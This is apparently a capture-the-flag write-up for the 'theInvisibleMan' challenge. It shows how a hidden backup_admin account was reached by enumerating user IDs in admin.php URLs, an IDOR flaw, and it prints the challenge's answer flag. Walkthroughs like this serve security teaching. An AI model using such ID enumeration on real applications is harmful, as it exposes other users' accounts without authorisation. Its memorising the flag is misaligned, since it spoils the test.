## **Challenge Name: theInvisibleMan**

### **Description**

It's believed that DEADFACE compromised more than just one user on the web app. NVU prevents certain users from being displayed. See if you can find the flag associated with a privileged user.

Submit the flag as deadface{flag text}.

**Challenge URL**: `http://env01.deadface.io:8080`

---

### **Approach**

1. **Understanding IDOR Vulnerability**  
   - From the admin panel, attempted to view user details
   - Noted that `backup_admin` was not in the visible user list
   - Suspected an Insecure Direct Object Reference (IDOR) vulnerability

2. **Enumerating User IDs**  
   - Used the user view endpoint with different IDs:
     ```
     http://env01.deadface.io:8080/admin.php?view_user=16&source=ui
     ```
   - Found `backup_admin` at user ID 16

3. **Accessing Without Source Parameter**  
   - The source code showed that accessing `backup_admin` without the `source=ui` parameter would reveal a flag
   - Accessed: `http://env01.deadface.io:8080/admin.php?view_user=16`
   - Received the IDOR flag:
     ```
     IDOR Vulnerability Discovered!
     You successfully accessed a hidden user account by enumerating user IDs.
     
     Flag: deadface{1ns3cur3_d1r3ct_0bj3ct_r3f3r3nc3}
     ```

---

### **Flag**

```
deadface{1ns3cur3_d1r3ct_0bj3ct_r3f3r3nc3}
```

---

